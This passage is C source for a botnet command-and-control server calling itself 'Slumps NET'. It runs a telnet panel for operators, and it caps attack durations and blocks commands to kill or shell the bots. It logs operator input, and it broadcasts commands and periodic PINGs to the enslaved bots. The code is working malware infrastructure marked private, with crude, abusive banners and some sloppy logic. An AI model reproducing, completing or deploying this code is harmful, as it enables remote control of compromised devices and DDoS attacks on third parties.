        if(send(thefd, WHITE8, strlen(WHITE8), MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
		}
		if(strstr(buf, "CLEAR_SMALL")){
		if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        char small1[80];
	 
		sprintf(small1, "\x1b[0;37m*\x1b[0;31mWelcome To The Slumps NET BITCH >.< S0Sexy!\x1b[0;37m*\r\n");
		
        if(send(thefd, "\x1b[0;37m*****************************************\r\n", 51, MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, small1, strlen(small1), MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, "\x1b[0;37m*****************************************\r\n\r\n~>\x1b[0m", 50, MSG_NOSIGNAL) == -1) goto end;
		while(1) {
		if(send(thefd, "\x1b[0;31m~> \x1b[0;31m", 13, MSG_NOSIGNAL) == -1) goto end;
		break;
		}
		pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
		continue;
     	}
		
        if(strstr(buf, "LOGOUT")) 
	    {  
 		  sprintf(botnet, "Why Are You Leaving |SLUMPS NET| Owns You %s Cya Next Time\r\n", accounts[find_line].id, buf);
		  if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  goto end;
		} // if someone tries to send a attack above 200O SEC it will kick them off  :)
		if(strstr(buf, "16030")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "17200")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "18030")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "19500")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "20300")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
     	if(strstr(buf, "21500")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "22300")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "23020")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
      	if(strstr(buf, "24300")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
		if(strstr(buf, "25600")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
		if(strstr(buf, "26400")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
    	if(strstr(buf, "27300")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "28400")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "10000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        } // max time
	    if(strstr(buf, "10000")) 
		{  
		printf("ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("TIME.log", "a");
        fprintf(logFile, "ATTEMPT TO SEND MORE TIME THEN NEEDED BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "LOLNOGTFO")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }
	    if(strstr(buf, "GTFOFAG")) 
		{  
		printf("ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("KILL.log", "a");
        fprintf(logFile, "ATTEMPT TO KILL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
        }//if you dont like this just take out common sense 
    	if(strstr(buf, "SH")) 
		{  
	    printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SH.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS %s\n", accounts[find_line].id, buf);
        fclose(logFile);
	    goto end;
		}
		if(strstr(buf, "SHELL")) 
		{  
		printf("ATTEMPT TO SHELL YOUR BOTS BY %s\n", accounts[find_line].id, buf);
		FILE *logFile;
        logFile = fopen("SH.log", "a");
        fprintf(logFile, "ATTEMPT TO STEAL BOTS BY %s\n", accounts[find_line].id, buf);
        fclose(logFile);
		goto end;
				}
     			trim(buf);
                if(send(thefd, "\x1b[37m~> \x1b[0m", 11, MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
                printf("%s: \"%s\"\n",accounts[find_line].id, buf);
                FILE *logFile;
                logFile = fopen("report.log", "a");
                fprintf(logFile, "%s: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
                broadcast(buf, thefd, usernamez);
                memset(buf, 0, 2048);
        }
 
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
        while(1)
        {
                newsockfd = accept(sockfd, (struct sockaddr *) &cli_addr, &clilen);
                if (newsockfd < 0) perror("ERROR on accept");
                pthread_t thread;
                pthread_create( &thread, NULL, &telnetWorker, (void *)newsockfd);
        }
}
 
int main (int argc, char *argv[], void *sock)
{
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 4)
        {
                fprintf (stderr, "Usage: %s [port] [threads] [cnc-port]\n", argv[0]);
                exit (EXIT_FAILURE);
        }
		port = atoi(argv[3]);
		printf("\x1b[32mPrivate file,\x1b[33m THIS IS SLUMPS SHIT, \x1b[34mDO \x1b[35mNOT \x1b[36mLEAK\x1b[0m\n");
        telFD = fopen("bots.txt", "a+");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "PURGE");
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}